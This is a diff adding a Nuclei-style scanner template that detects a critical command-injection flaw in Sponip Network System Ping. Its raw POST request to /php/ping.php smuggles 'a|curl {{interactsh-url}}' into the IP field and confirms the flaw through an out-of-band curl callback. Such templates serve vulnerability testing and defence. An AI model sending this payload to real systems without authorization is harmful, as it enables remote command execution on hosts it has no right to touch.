@@ -1,0 +1,40 @@
+http:
+- matchers:
+  - name: http
+    part: interactsh_protocol
+    type: word
+    words:
+    - http
+  - part: interactsh_request
+    type: word
+    words:
+    - 'User-Agent: curl'
+  matchers-condition: and
+  raw:
+  - 'POST /php/ping.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    sondata[ip]=a|curl {{interactsh-url}}&jsondata[type]=1
+
+    '
+id: sponip-network-system-ping-rce
+info:
+  author: pikpikcu
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cwe-id: CWE-77
+  description: 'Sponip Network System Ping is susceptible to remote code execution.
+
+    '
+  metadata:
+    max-request: 1
+  name: Sponip Network System Ping - Remote Code Execution
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=Mzg3NDU2MTg0Ng==&mid=2247486018&idx=1&sn=d744907475a4ea9ebeb26338c735e3e9
+  severity: critical
+  tags: sponip,rce,oast
